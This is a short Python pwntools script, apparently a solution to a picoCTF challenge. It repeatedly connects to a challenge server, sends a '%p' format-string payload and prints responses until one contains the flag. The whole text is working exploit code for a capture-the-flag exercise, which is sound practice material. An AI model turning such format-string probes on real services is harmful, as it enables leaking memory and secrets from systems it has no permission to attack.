from pwn import *

host, port = 'mimas.picoctf.net', 49895

for i in range(1025):
    connect = remote(host, port)
    connect.recvuntil(b'\n')
    connect.sendline('%p')
    response = connect.recv()

    if b"CTF" in response:
        print(response)
        connect.close()
        break
    print(i, response)
    connect.close()

